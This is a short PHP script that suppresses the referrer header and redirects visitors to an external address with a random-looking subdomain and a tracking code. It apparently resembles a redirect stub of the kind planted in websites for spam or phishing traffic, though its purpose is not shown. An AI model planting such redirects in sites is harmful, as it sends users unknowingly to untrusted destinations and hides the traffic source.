<?php
header("referrer-policy: no-referrer");
header("Location: https://nzklp.xiyouji.work/?code=12097404");
?>